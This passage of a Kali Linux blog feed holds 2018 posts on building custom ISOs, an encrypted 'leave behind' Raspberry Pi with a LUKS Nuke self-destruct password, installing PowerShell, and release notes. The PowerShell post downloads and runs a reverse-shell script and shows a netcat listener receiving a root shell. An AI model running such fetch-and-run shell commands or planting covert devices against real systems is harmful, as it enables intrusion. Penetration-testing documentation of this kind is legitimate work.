<description><p>We use live-build to create our official Kali releases and we encourage users to jump in and build their own customized versions of Kali whenever we can. Our <a href="https://www.kali.org/docs/development/live-build-a-custom-kali-iso/">documentation of the process</a> is one of the most popular items on our <a href="https://www.kali.org/docs/">documentation site</a>, and the Kali Dojo also revolves around this topic. We love it and our users love it.</p> <p>One roadblock of live-build has always been the fact that you need a Kali system to build a Kali system. The reason for this is that small changes in both the original debootstrap and live-build packages are needed for building a Kali ISO. In Kali, these changes are already included, however in most <a href="https://wiki.debian.org/Derivatives/">Debian derivatives</a>, some gentle massaging is needed to get our ISOs to build.</p> <p>Today, we have updated our docs site to include instructions on how to <a href="https://www.kali.org/docs/development/live-build-a-custom-kali-iso/">build a custom Kali ISO</a> on other Debian based systems such as Debian 9 (Stretch/) and Ubuntu 16.04 and 18.04. This will hopefully allow users running Debian derivatives to test the waters with Kali and play with one of its cooler features.</p> <p>Building a custom Kali release with live-build is not as scary as it might sound so be sure to give it a chance!</p> <h2 id="building-kali-on-non-kali-debian-based-systems">Building Kali on Non-Kali Debian Based Systems</h2> <p>You can easily run live-build on Debian based systems other than Kali. The instructions below have been tested to work with both Debian and Ubuntu.</p> <p>First, we prep the system by ensuring it is fully updated, then proceed to download the Kali archive keyring and live-build packages. The latest versions of these packages can always be found at <a href="http://http.kali.org/pool/main/k/kali-archive-keyring/">http.kali.org/pool/main/k/kali-archive-keyring/</a> and <a href="https://archive.kali.org/kali/pool/main/l/live-build/">archive.kali.org/kali/pool/main/l/live-build/</a> respectively:</p> <pre><code class="language-sh">sudo apt update sudo apt -y upgrade wget https://http.kali.org/pool/main/k/kali-archive-keyring/kali-archive-keyring_2018.1_all.deb wget https://archive.kali.org/kali/pool/main/l/live-build/live-build_20180618kali1_all.deb </code></pre> <p>With that completed, we install some additional dependencies and the previously downloaded files:</p> <pre><code class="language-sh">sudo apt -y install git live-build cdebootstrap debootstrap curl sudo dpkg -i kali-archive-keyring_2018.1_all.deb sudo dpkg -i live-build_20180618kali1_all.deb </code></pre> <p>With the environment all prepared, we start the live-build process by setting up the build script and checking out the build config:</p> <pre><code class="language-sh">cd /usr/share/debootstrap/scripts/ (echo &quot;default_mirror http://http.kali.org/kali&quot;; sed -e &quot;s/debian-archive-keyring.gpg/kali-archive-keyring.gpg/g&quot; sid) &gt; kali sudo ln -s kali kali-rolling cd ~ git clone git://gitlab.com/kalilinux/build-scripts/live-build-config.git cd live-build-config/ </code></pre> <p>At this point, we have to edit the <strong><em>build.sh</em></strong> script to bypass a version check. We do this by commenting out the &ldquo;exit 1&rdquo; below:</p> <pre><code class="language-sh"># Check we have a good debootstrap ver_debootstrap=$(dpkg-query -f '${Version}' -W debootstrap) if dpkg --compare-versions &quot;$ver_debootstrap&quot; lt &quot;1.0.97&quot;; then if ! echo &quot;$ver_debootstrap&quot; | grep -q kali; then echo &quot;ERROR: You need debootstrap &gt;= 1.0.97 (or a Kali patched debootstrap). Your current version: $ver_debootstrap&quot; &gt;&amp;2 exit 1 fi fi </code></pre> <p>With that change made, the script should look as follows:</p> <pre><code class="language-sh"># Check we have a good debootstrap ver_debootstrap=$(dpkg-query -f '${Version}' -W debootstrap) if dpkg --compare-versions &quot;$ver_debootstrap&quot; lt &quot;1.0.97&quot;; then if ! echo &quot;$ver_debootstrap&quot; | grep -q kali; then echo &quot;ERROR: You need debootstrap &gt;= 1.0.97 (or a Kali patched debootstrap). Your current version: $ver_debootstrap&quot; &gt;&amp;2 # exit 1 fi fi </code></pre> <p>We can now build our ISO as normal:</p> <pre><code class="language-sh">sudo ./build.sh --variant light --verbose </code></pre> <h2 id="no-commitment-testing">No Commitment Testing</h2> <p>After you get Kali built, you might want to quickly test the ISO you created. There is a fast no commitment trial you can do with QEMU. On Ubuntu, you just have to prep the system by installing a few packages:</p> <pre><code class="language-sh">sudo apt -y install qemu-kvm libvirt-bin ubuntu-vm-builder bridge-utils sudo adduser $(id -un) kvm newgrp kvm </code></pre> <p>With that out of the way, we will create a dynamic disk image to hold our Kali installation and then boot off our newly created ISO. Don&rsquo;t worry about the disk size&ndash;it will grow as needed so you won&rsquo;t suddenly fill your drive just by creating the disk:</p> <pre><code class="language-sh">qemu-img create -f qcow2 kali-disk.img 100G kvm --name Kali -m 1024 -hda kali-disk.img -cdrom kali-linux-light-rolling-amd64.iso -boot d </code></pre> <p><p> <a href='https://www.kali.org/blog/build-kali-with-live-build-on-debian-based-systems/images/02-screen_shot_2018-07-14_at_10.53.36_am.png'> <img src="https://www.kali.org/blog/build-kali-with-live-build-on-debian-based-systems/images/02-screen_shot_2018-07-14_at_10.53.36_am.png" alt="" /> </a> </p> </p> <p>At this point, you can run a live instance of Kali, or install it to the virtual disk. If we go ahead and install it, we would then later launch the newly created VM with the command:</p> <pre><code class="language-sh">kvm --name Kali -m 1024 -hda kali-disk.img -boot c </code></pre> <p><p> <a href='https://www.kali.org/blog/build-kali-with-live-build-on-debian-based-systems/images/01-screen_shot_2018-07-14_at_11.05.07_am.png'> <img src="https://www.kali.org/blog/build-kali-with-live-build-on-debian-based-systems/images/01-screen_shot_2018-07-14_at_11.05.07_am.png" alt="" /> </a> </p> </p> <p>There are few things as satisfying as running your own Linux install that you created and tweaked for what you need. With a way to build Kali on other Debian based distributions and a quick way to test it, why wait?</p></description>
</item>
<item>
<title>Secure Kali Pi 2018</title>
<link>https://www.kali.org/blog/secure-kali-pi-2018/</link>
<guid isPermaLink="true">https://www.kali.org/blog/secure-kali-pi-2018/</guid>
<pubDate>Tue, 10 Jul 2018 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/secure-kali-pi-2018/images/secure-kali-pi-2018-1.jpg" type="image/jpg"/>
<description><p>We have covered how to create secure &ldquo;throw-away hack boxes&rdquo; using the Raspberry Pi <a href="https://www.kali.org/docs/arm/raspberry-pi-with-luks-full-disk-encryption/">before</a>, but we thought it was time to go back and take a look at the process again. With all the new Raspberry Pi models and Kali changes from when we last covered this, we found the old process was in need of some updating.</p> <p>As a review, what we are trying to accomplish is to create a standalone &ldquo;leave behind&rdquo; device that, when discovered, does not make it easy to figure out what you were doing. So we use the LUKS full disk encryption along with the LUKS Nuke capability to put this together. If you have a Raspberry Pi 3 Model B+, or really any other model or similar device, feel free to use the instructions below to set up your own secure system. This updated process is based on our previous documentation, and updated with some <a href="https://github.com/tothi/kali-rpi-luks-crypt">community</a> <a href="https://github.com/NicoHood/NicoHood.github.io/wiki/Raspberry-Pi-Encrypt-Root-Partition-Tutorial">suggestions</a>.</p> <h2 id="overview-of-the-process">Overview of the process</h2> <p>Before we dive into the tech of what we are going to try to accomplish, let&rsquo;s take a quick look at our goals on setting up our Raspberry Pi 3 Model B+ (henceforth called &ldquo;RPi&rdquo;):</p> <ol> <li>Create a normal Kali Linux RPi installation</li> <li>Prepare the system for encrypted boot with remote disk unlock</li> <li>Create an initramfs configured with Dropbear and SSH keys to allow the unlock to occur</li> <li>Backup existing data</li> <li>Configure the encrypted partitions</li> <li>Restore our data</li> <li>Configure LUKS Nuke</li> <li>Hack away!</li> </ol> <p>This might seem like a lot, but its really pretty straightforward and once completed, we will be left with a RPi that will boot, get an IP from DHCP, and Dropbear will allow us to connect via SSH to provide the LUKS key. This permits us to run the RPi headless, but still keeping our data secure. Then down the road when we are done with it, we can retrieve it or remote in and destroy our data with LUKS NUKE.</p> <h2 id="preparing-the-base-system">Preparing the Base system</h2> <p>To start with, we need to write out the RPi image to a SD card. We won&rsquo;t get into that here, but you can find information on doing so <a href="https://www.kali.org/docs/arm/raspberry-pi/">in our docs</a>.</p> <p>With that out of the way, we insert the SD card into the RPi and let it boot up. On first boot, it will resize the SD card and reboot, after that it&rsquo;s ready for use. Next, we connect over SSH, update Kali, and install a few packages we will need:</p> <pre><code class="language-sh">apt update apt dist-upgrade apt install cryptsetup lvm2 busybox dropbear </code></pre> <h2 id="doing-the-magic-fu">Doing the Magic-Fu</h2> <p>The RPi is all setup and ready to go so let&rsquo;s get our hands dirty and dive into things. Take note, once we start this process, we are going to be changing a number of critical files on our RPi installation. It is important to not reboot the device or otherwise shut down the system until you are ready or you will be left with a system that won&rsquo;t boot.</p> <p>First off, we need to append a line to <strong><em>/boot/config.txt</em></strong>:</p> <pre><code class="language-sh">echo initramfs initramfs.gz followkernel &gt;&gt; /boot/config.txt </code></pre> <p>Next, we want to validate where our actual root filesystem device is located:</p> <pre><code class="language-console">root@kali:~# cat /etc/fstab # proc /proc proc defaults 0 0 /dev/mmcblk0p1 /boot vfat defaults 0 2 /dev/mmcblk0p2 / ext4 defaults,noatime 0 1 </code></pre> <p>Take special note that our root filesystem lives at <strong><em>/dev/mmcblk0p2</em></strong>. This is what we will use for our examples going forward, so be sure to update the instructions with whatever value you received on your system.</p> <p>Now that we know our root filesystem location, we will edit the <strong><em>/boot/cmdline.txt</em></strong> . By default, it contains the following:</p> <pre><code class="language-console">root@kali:~# cat /boot/cmdline.txt dwc_otg.fiq_fix_enable=2 console=ttyAMA0,115200 kgdboc=ttyAMA0,115200 console=tty1 root=/dev/mmcblk0p2 rootfstype=ext4 rootwait rootflags=noload net.ifnames=0 </code></pre> <p>Take note of the entry reading <em>root=/dev/mmcblk0p2</em>. We are going to update it with a <em>cryptdevice</em> value:</p> <pre><code class="language-sh">root=/dev/mapper/crypt cryptdevice=/dev/mmcblk0p2:crypt </code></pre> <p>With the change made, our file looks like this:</p> <pre><code class="language-console">root@kali:~# cat /boot/cmdline.txt dwc_otg.fiq_fix_enable=2 console=ttyAMA0,115200 kgdboc=ttyAMA0,115200 console=tty1 root=/dev/mapper/crypt cryptdevice=/dev/mmcblk0p2:crypt rootfstype=ext4 rootwait rootflags=noload net.ifnames=0 </code></pre> <p>We also need to edit <strong><em>/etc/fstab</em></strong> and replace the device where our root filesystem currently is to be <strong><em>/dev/mapper/crypt</em></strong>:</p> <pre><code class="language-console">root@kali:~# cat /etc/fstab # proc /proc proc defaults 0 0 /dev/mmcblk0p1 /boot vfat defaults 0 2 /dev/mapper/crypt / ext4 defaults,noatime 0 1 #/dev/mmcblk0p2 / ext4 defaults,noatime 0 1 </code></pre> <p>Next, we need to create a <strong><em>/etc/crypttab</em></strong> file containing the following:</p> <pre><code class="language-sh">crypt /dev/mmcblk0p2 none luks </code></pre> <p>Take special care here&ndash;the separators between the entries <em>have to be tabs</em>, not spaces. Now, before we start to create our initramsfs, we need to do a sly little hack to force cryptsetup to be included. To do this, we will create a fake LUKS filesystem. We <strong>dd</strong> an empty file, format it as LUKS, mount it, and put a filesystem on it:</p> <pre><code class="language-sh">dd if=/dev/zero of=/tmp/fakeroot.img bs=1M count=20 cryptsetup luksFormat /tmp/fakeroot.img cryptsetup luksOpen /tmp/fakeroot.img crypt mkfs.ext4 /dev/mapper/crypt </code></pre> <p>Don&rsquo;t worry too much about setting a strong password for this fakeroot as it is only used in this instance.</p> <h2 id="setting-up-ssh-and-initramfs">Setting up SSH and Initramfs</h2> <p>Now we are on the home stretch. This part is really cool, as normally when a system running LUKS starts up, the boot process pauses to allow you to unlock the HDD with your LUKS key. If you are running a headless system, that&rsquo;s not especially convenient.</p> <p>To work around that, we are going to configure Dropbear to start up, allow you to authenticate with SSH, and then connect you to provide your LUKS password&ndash;all from remote!</p> <p>We start out by creating a file at <strong><em>/etc/dropbear-initramfs/authorized_keys</em></strong> that contains:</p> <pre><code class="language-sh">command=&quot;export PATH='/sbin:/bin/:/usr/sbin:/usr/bin'; /scripts/local-top/cryptroot &amp;&amp; kill -9 \`ps | grep -m 1 'cryptroot' | cut -d ' ' -f 3\` &amp;&amp; exit&quot; </code></pre> <p>Its important to note, this needs to be all on one line. No line breaks in there at all. If you have this set up right, it should look similar to this:</p> <pre><code class="language-console">root@kali:~# cat /etc/dropbear-initramfs/authorized_keys command=&quot;export PATH='/sbin:/bin/:/usr/sbin:/usr/bin'; /scripts/local-top/cryptroot &amp;&amp; kill -9 `ps | grep -m 1 'cryptroot' | cut -d ' ' -f 3` &amp;&amp; exit&quot; ssh-rsa AAAAB3NzaC... user@system </code></pre> <p>Next, we make a small change to <strong><em>/usr/share/initramfs-tools/scripts/init-premount/dropbear</em></strong>. This change is due to the fact that we need to slow down Dropbear to ensure that networking is set up before Dropbear kicks in. At the end of the file, where it reads:</p> <pre><code class="language-sh"># On NFS mounts, wait until the network is configured. On local mounts, # configure the network in the background (in run_dropbear()) so someone # with console access can enter the passphrase immediately. (With the # default ip=dhcp, configure_networking hangs for 5mins or so when the # network is unavailable, for instance.) [ &quot;$BOOT&quot; != nfs ] || configure_networking run_dropbear &amp; echo $! &gt;/run/dropbear.pid </code></pre> <p>We want to add in a simple <strong>sleep</strong> statement like so:</p> <pre><code class="language-sh">[ &quot;$BOOT&quot; != nfs ] || configure_networking sleep 5 run_dropbear &amp; echo $! &gt;/run/dropbear.pid </code></pre> <p>With that completed, we are finally ready to create our initramfs!</p> <pre><code class="language-sh">mkinitramfs -o /boot/initramfs.gz </code></pre> <p>Before proceeding, we ensure that our customized changes made it into the new initramfs:</p> <pre><code class="language-sh">lsinitramfs /boot/initramfs.gz | grep cryptsetup lsinitramfs /boot/initramfs.gz | grep authorized </code></pre> <p>With that validated, we ensure all changes are written to disk and shut the RPi down:</p> <pre><code class="language-sh">sync &amp;&amp; sync init 0 </code></pre> <h2 id="backup-and-restore">Backup and Restore</h2> <p>Remove the SD card from your RPi and return to the system you initially used to write the SD card. Let&rsquo;s prepare the environment:</p> <pre><code class="language-sh">ls -al /mnt/{chroot,backup,encrypted} # Please make sure there is nothing here first before you move on, otherwise you will have a bad day. rm -rf /mnt/{chroot,backup,encrypted} mkdir -p /mnt/{chroot,backup,encrypted} </code></pre> <p>Now insert the SD card and validate the device ID. In our case, the device is <strong><em>/dev/sdc2</em></strong> but yours might be different so adjust as necessary on your system. We mount the device and make a backup of the filesystem:</p> <pre><code class="language-sh">mount /dev/sdc2 /mnt/chroot/ rsync -avh /mnt/chroot/* /mnt/backup/ umount /mnt/chroot </code></pre> <p>Once that is done, we delete the existing 2nd partition on the SD card and recreate an empty one, which we set up for LUKS encryption:</p> <pre><code class="language-sh">echo -e &quot;d\n2\nw&quot; | fdisk /dev/sdc echo -e &quot;n\np\n2\n\n\nw&quot; | fdisk /dev/sdc </code></pre> <p>With the partitions updated, we reload them by running <strong>partprobe</strong> and then configure LUKS on the new partition:</p> <pre><code class="language-sh">cryptsetup -v -y --cipher aes-cbc-essiv:sha256 --key-size 256 luksFormat /dev/sdc2 cryptsetup -v luksOpen /dev/sdc2 crypt mkfs.ext4 /dev/mapper/crypt </code></pre> <p>With that out of the way, we restore the root filesystem backup to the now encrypted partition:</p> <pre><code class="language-sh">mount /dev/mapper/crypt /mnt/encrypted/ rsync -avh /mnt/backup/* /mnt/encrypted/ sync umount /mnt/encrypted/ cryptsetup luksClose /dev/mapper/crypt </code></pre> <h2 id="testing-it-out">Testing it out</h2> <p>You can now put the SD card back into the RPi and let it start up. If you watch the boot, you should see Dropbear start up. At that point, you should be able to SSH into the system and unlock the drive:</p> <pre><code class="language-console">root@kali:~# ssh -o &quot;UserKnownHostsFile /dev/null&quot; root@10.42.42.94 The authenticity of host '10.42.42.94 (10.42.42.94)' can't be established. ECDSA key fingerprint is SHA256:L+QVP+OmncGDleuEoj77OlRGuCji2gp0c1gMYjUupU0. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added '10.42.42.94' (ECDSA) to the list of known hosts. Please unlock disk /dev/mmcblk0p2 (crypt): cryptsetup (crypt): set up successfully Connection to 10.42.42.94 closed. </code></pre> <p>The versatility of these little devices combined with the power of Kali never ceases to amaze us. Now we are left with a nice headless system we can operate with relative confidence that, even if it&rsquo;s discovered, it won&rsquo;t be too simple to get into.</p> <p>But we aren&rsquo;t done yet! Let&rsquo;s add in some <a href="https://www.kali.org/blog/nuke-kali-linux-luks/">LUKS NUKE</a> functionality:</p> <pre><code class="language-sh">cryptsetup luksDump /dev/mmcblk0p2 cryptsetup luksAddNuke /dev/mmcblk0p2 </code></pre> <p>Now when we SSH in, we have one password we can enter to allow the SD card to unlock and continue the boot process, and another that destroys the LUKS header, making the data inaccessible. If you end up in a situation where you can&rsquo;t retrieve the device, this option to burn the device could be very helpful. If you want to be really fancy, you could also combine this with <a href="https://web.archive.org/web/20210914172345/https://kali.training/topic/exercise-chapter-5-mid-course-project/">making the RPi into a wireless access point</a>, allowing you to remote in and unlock/nuke the system all through a wireless connection. This is very useful if you won&rsquo;t have ongoing direct access to the network the RPi will be attached to.</p></description>
</item>
<item>
<title>Installing PowerShell on Kali Linux</title>
<link>https://www.kali.org/blog/installing-powershell-on-kali-linux/</link>
<guid isPermaLink="true">https://www.kali.org/blog/installing-powershell-on-kali-linux/</guid>
<pubDate>Wed, 06 Jun 2018 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/installing-powershell-on-kali-linux/images/powershell-on-kali-linux-v3.jpg" type="image/jpg"/>
<description><h2 id="update-nov-2019"><strong>UPDATE NOV 2019</strong></h2> <p>This post is out of date as of 2019 as powershell has been added to the primary repos. Just do a:</p> <pre><code class="language-sh">apt update &amp;&amp; apt -y install powershell </code></pre> <p>And you will have powershell on your system.</p> <h3 id="old-post">Old Post</h3> <p>You may already be aware that you can safely <a href="https://www.kali.org/blog/advanced-package-management-in-kali-linux/">add external repositories to your Kali Linux installation</a> but you may not be aware that one of the many repositories available online includes one from Microsoft that includes <a href="https://github.com/PowerShell/PowerShell">PowerShell</a>. The repository is for Debian but its packages install perfectly well on Kali, as we will show in this post.</p> <h3 id="powershell-package-installation-in-kali">PowerShell Package Installation in Kali</h3> <p>We begin by installing the necessary dependencies, most of which should already be installed in your Kali installation by default:</p> <pre><code class="language-sh">apt update &amp;&amp; apt -y install curl gnupg apt-transport-https </code></pre> <p>Next, we need to download and add the public repository GPG key so APT will trust the packages and alert you to any issues with package signatures:</p> <pre><code class="language-sh">curl https://packages.microsoft.com/keys/microsoft.asc | apt-key add - </code></pre> <p>With the GPG key added, we proceed to add the Microsoft package repository to its own package list file under <strong>/etc/apt/sources.list.d/</strong> and update the list of available packages:</p> <pre><code class="language-sh">echo &quot;deb [arch=amd64] https://packages.microsoft.com/repos/microsoft-debian-stretch-prod stretch main&quot; &gt; /etc/apt/sources.list.d/powershell.list apt update </code></pre> <p>Finally, we proceed to install the powershell package:</p> <pre><code class="language-sh">apt -y install powershell </code></pre> <h3 id="running-powershell">Running PowerShell</h3> <p>When the package installation completes, running <strong>pwsh</strong> will start up PowerShell, presenting us with the familiar &ldquo;PS&rdquo; prompt:</p> <pre><code class="language-console">root@kali:~# pwsh PowerShell v6.1.0-preview.2 Copyright (c) Microsoft Corporation. All rights reserved. https://aka.ms/pscore6-docs Type 'help' to get help. PS /root&gt; </code></pre> <p>If you&rsquo;re new to PowerShell, one of the first things you will likely want to do is update the built-in help, which can be done by running the <strong>Update-Help</strong> Cmdlet. This may take a little while to complete but only really needs to be run once in a rare while:</p> <pre><code class="language-console">PS /root&gt; Update-Help Updating Help for module Microsoft.PowerShell.Utility Locating Help Content... </code></pre> <p>As you might expect, you won&rsquo;t find all the commands you&rsquo;re used to when using PowerShell on Windows but all of the core modules are present and the code is under constant development and improvement:</p> <pre><code class="language-console">PS /root&gt; Get-Process -Name gnome* NPM(K) PM(M) WS(M) CPU(s) Id SI ProcessName ------ ----- ----- ------ -- -- ----------- 0 0.00 5.71 0.03 1073 072 gnome-keyring-d 0 0.00 9.80 0.19 659 649 gnome-session-b 0 0.00 13.72 0.36 1089 080 gnome-session-b 0 0.00 110.06 3.36 778 649 gnome-shell 0 0.00 277.15 27.85 1170 080 gnome-shell 0 0.00 11.77 0.09 1199 075 gnome-shell-cal 0 0.00 77.79 4.58 1381 080 gnome-software 0 0.00 36.58 2.03 1646 646 gnome-terminal- </code></pre> <p>One of the surprising things you <em>can</em> do however, is use PowerShell to send a reverse shell to a Netcat listener. We came across a <a href="https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1">small PowerShell reverse shell</a> online and much to our surprise, it happily connected back to our listener:</p> <pre><code class="language-console">root@kali:~# pwsh PowerShell v6.1.0-preview.2 Copyright (c) Microsoft Corporation. All rights reserved. https://aka.ms/pscore6-docs Type 'help' to get help. PS /root&gt; wget -q https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1 PS /root&gt; ./mini-reverse.ps1 -------------------------------------------------------------------------------- root@kali:~# nc -lvnp 413 listening on [any] 413 ... connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 59006 id uid=0(root) gid=0(root) groups=0(root) uname -a Linux kali 4.15.0-kali3-amd64 #1 SMP Debian 4.15.17-1kali1 (2018-04-25) x86_64 GNU/Linux </code></pre> <p>We think it&rsquo;s remarkable that, not only did Microsoft Open-source PowerShell, they&rsquo;ve also been constantly updating and improving it, and having a public package repository for it makes installation a breeze.</p></description>
</item>
<item>
<title>Kali Linux 2018.2 Release</title>
<link>https://www.kali.org/blog/kali-linux-2018-2-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-2018-2-release/</guid>
<pubDate>Mon, 30 Apr 2018 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-2018-2-release/images/kali-release.jpg" type="image/jpg"/>
<description><p>This Kali release is the first to include the Linux 4.15 kernel, which includes the x86 and x64 fixes for the much-hyped <a href="https://meltdownattack.com/">Spectre and Meltdown</a> vulnerabilities. It also includes much <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f6705bf959efac87bca76d40050d342f1d212587">better support for AMD GPUs</a> and support for <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=33e63acc119d15c2fac3e3775f32d1ce7a01021b">AMD Secure Encrypted Virtualization</a>, which allows for encrypting virtual machine memory such that even the hypervisor can&rsquo;t access it.</p> <h3 id="easier-metasploit-script-access">Easier Metasploit Script Access</h3> <p>If you spend any significant amount of time writing exploits, you are undoubtedly familiar with the various Metasploit scripts that are available, such as <strong><em>pattern_create</em></strong>, <strong><em>pattern_offset</em></strong>, <strong><em>nasm_shell</em></strong>, etc. You are likely also aware that all of these helpful scripts are tucked away under <em>/usr/share/metasploit-framework/tools/exploit/</em>, which makes them more than a little difficult to make use of. Fortunately, as of <em>metasploit-framework_4.16.34-0kali2</em>, you can now make use of all these scripts directly as we have included links to all of them in the PATH, each of them prepended with <strong><em>msf-</em></strong>:</p> <pre><code class="language-console">root@kali:~# msf-&lt;tab&gt; msf-egghunter msf-java_deserializer msf-nasm_shell msf-exe2vba msf-jsobfu msf-pattern_create msf-exe2vbs msf-makeiplist msf-pattern_offset msf-find_badchars msf-md5_lookup msf-pdf2xdp msf-halflm_second msf-metasm_shell msf-virustotal msf-hmac_sha1_crack msf-msf_irb_shell root@kali:~# root@kali:~# msf-pattern_create -l 50 -s ABC,123 A1A2A3B1B2B3C1C2C3A1A2A3B1B2B3C1C2C3A1A2A3B1B2B3C1 root@kali:~# </code></pre> <h3 id="package-updates">Package Updates</h3> <p>In addition to the above changes, there have been updates to a number of applications including <a href="https://pkg.kali.org/pkg/bloodhound">Bloodhound</a>, <a href="https://www.kali.org/tools/reaver/">Reaver</a>, <a href="https://www.kali.org/tools/pixiewps/">PixieWPS</a>, <a href="https://www.kali.org/tools/burpsuite/">Burp Suite</a>, <a href="https://www.kali.org/tools/hashcat/">Hashcat</a>, and more. Since there are far too many packages to include in a default ISO, to see the full list of changes, we encourage you to review the <a href="https://bugs.kali.org/changelog_page.php">Kali Changelog</a>.</p> <h3 id="download-kali-linux-20182">Download Kali Linux 2018.2</h3> <p>If you would like to check out this latest and greatest Kali release, you can find download links for ISOs and Torrents on the <a href="https://www.kali.org/get-kali/">Kali Downloads</a> page along with links to the OffSec virtual machine and ARM images, which have also been updated to 2018.2. If you already have a Kali installation you&rsquo;re happy with, you can easily upgrade in place as follows:</p> <pre><code class="language-console">root@kali:~# apt update &amp;&amp; apt full-upgrade </code></pre> <p>As always, if you encounter any bugs at all, we implore you to open a report on our <a href="https://bugs.kali.org/main_page.php">bug tracker</a>. We can&rsquo;t fix what we don&rsquo;t know about.</p></description>
</item>
<item>
<title>Finding Packages for Kali Linux</title>
<link>https://www.kali.org/blog/finding-packages-for-kali-linux/</link>
<guid isPermaLink="true">https://www.kali.org/blog/finding-packages-for-kali-linux/</guid>
<pubDate>Tue, 17 Apr 2018 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/finding-packages-for-kali-linux/images/kali-advanced-package-management-2.jpg" type="image/jpg"/>
<description><p>In an earlier post, we covered <a href="https://www.kali.org/blog/advanced-package-management-in-kali-linux/">Package Management in Kali Linux</a>. With the ease of installation that APT provides, we have the choice amongst tens of thousands of packages but the downside is, we have tens of thousands of packages. Finding out what packages are available and finding the one(s) we want can be a daunting task, particularly for newcomers to Linux. In this post, we will cover three utilities that can be used to search through the haystack and help you take advantage of the vast Open-source ecosystem.</p> <h3 id="apt-cache">apt-cache</h3> <p>Of the various interfaces available to search for packages, apt-cache is the most basic and rudimentary of them all. However, it is also the interface we tend to use most often because it is fast, easy, and efficient. By default, apt-cache searches for a given term in package names as well as their descriptions. For example, knowing that all <a href="https://www.kali.org/docs/general-use/metapackages/">Kali Linux metapackages</a> include &lsquo;kali-linux&rsquo; in their names, we can easily search for all of them:</p> <pre><code class="language-console">root@kali:~# apt-cache search kali-linux kali-linux - Kali Linux base system kali-linux-all - Kali Linux - all packages kali-linux-forensic - Kali Linux forensic tools kali-linux-full - Kali Linux complete system kali-linux-gpu - Kali Linux GPU tools kali-linux-nethunter - Kali NetHunter tools kali-linux-pwtools - Kali Linux password cracking tools kali-linux-rfid - Kali Linux RFID tools kali-linux-sdr - Kali Linux SDR tools kali-linux-top10 - Kali Linux Top 10 tools kali-linux-voip - Kali Linux VoIP tools kali-linux-web - Kali Linux webapp assessment tools kali-linux-wireless - Kali Linux wireless tools </code></pre> <p>In many cases, apt-cache returns far too many results because it searches in package descriptions. The searches can be limited to the package names themselves by using the <strong><em>--names-only</em></strong> option:</p> <pre><code class="language-console">root@kali:~# apt-cache search nmap | wc -l 37 root@kali:~# apt-cache search nmap --names-only dnmap - Distributed nmap framework fruitywifi-module-nmap - nmap module for fruitywifi nmap-dbgsym - debug symbols for nmap python-libnmap - Python 2 NMAP library python-libnmap-doc - Python NMAP Library (common documentation) python3-libnmap - Python 3 NMAP library libnmap-parser-perl - parse nmap scan results with perl nmap - The Network Mapper nmap-common - Architecture independent files for nmap zenmap - The Network Mapper Front End nmapsi4 - graphical interface to nmap, the network scanner python-nmap - Python interface to the Nmap port scanner python3-nmap - Python3 interface to the Nmap port scanner </code></pre> <p>Since apt-cache has such wonderfully greppable output, we can keep filtering results until they&rsquo;re at a manageable number:</p> <pre><code class="language-console">root@kali:~# apt-cache search nmap --names-only | egrep -v '(python|perl)' dnmap - Distributed nmap framework fruitywifi-module-nmap - nmap module for fruitywifi nmap - The Network Mapper nmap-common - Architecture independent files for nmap nmap-dbgsym - debug symbols for nmap nmapsi4 - graphical interface to nmap, the network scanner zenmap - The Network Mapper Front End </code></pre> <p>You can further filter down the search results but once you start chaining together a few commands, that&rsquo;s generally a good indication that it&rsquo;s time to reach for a different tool.</p> <h3 id="aptitude">aptitude</h3> <p>The <strong><em>aptitude</em></strong> application is a very close cousin of <strong><em>apt</em></strong> and <strong><em>apt-get</em></strong> except it also includes a very useful ncurses interface. It is not included in Kali by default but it can quickly be installed as follows:</p> <pre><code class="language-console">root@kali:~# apt update &amp;&amp; apt -y install aptitude </code></pre> <p>After installation, running aptitude without any options will launch the ncurses interface. One of the first things you will notice is that you can quickly and easily browse through packages by category, which greatly helps with sorting through the thousands of available packages.</p> <p><p> <a href='https://www.kali.org/blog/finding-packages-for-kali-linux/images/aptitude0.png'> <img src="https://www.kali.org/blog/finding-packages-for-kali-linux/images/aptitude0.png" alt="" /> </a> </p> </p> <p>To search for a package, either press the <strong>/</strong> character or select &lsquo;Find&rsquo; under the &lsquo;Search&rsquo; menu. As you enter your query, the package results will be updated dynamically.</p> <p><p> <a href='https://www.kali.org/blog/finding-packages-for-kali-linux/images/aptitude1.png'> <img src="https://www.kali.org/blog/finding-packages-for-kali-linux/images/aptitude1.png" alt="" /> </a> </p> </p> <p>Once you&rsquo;ve located a package of interest, you can mark it for installation with the <strong>+</strong> character or to remove/deselect it, the <strong>-</strong> character.</p> <p><p> <a href='https://www.kali.org/blog/finding-packages-for-kali-linux/images/aptitude2.png'> <img src="https://www.kali.org/blog/finding-packages-for-kali-linux/images/aptitude2.png" alt="" /> </a> </p> </p> <p>At this point, you can keep searching for other packages to mark for installation or removal. When you&rsquo;re ready to install, press the <strong>g</strong> key to view the summary of the actions to be taken.</p> <p><p> <a href='https://www.kali.org/blog/finding-packages-for-kali-linux/images/aptitude3.png'> <img src="https://www.kali.org/blog/finding-packages-for-kali-linux/images/aptitude3.png" alt="" /> </a> </p> </p> <p>If you&rsquo;re satisfied with the proposed changes, press <strong>g</strong> again and aptitude will complete the package installations as usual.</p> <h3 id="the-internet">The Internet</h3> <p>If you want to restrict your searches to tools that are packaged by the Kali team, the easiest way to do so is probably by using the Google <em>site</em> search operator.</p> <p><p> <a href='https://www.kali.org/blog/finding-packages-for-kali-linux/images/google-package-search.png'> 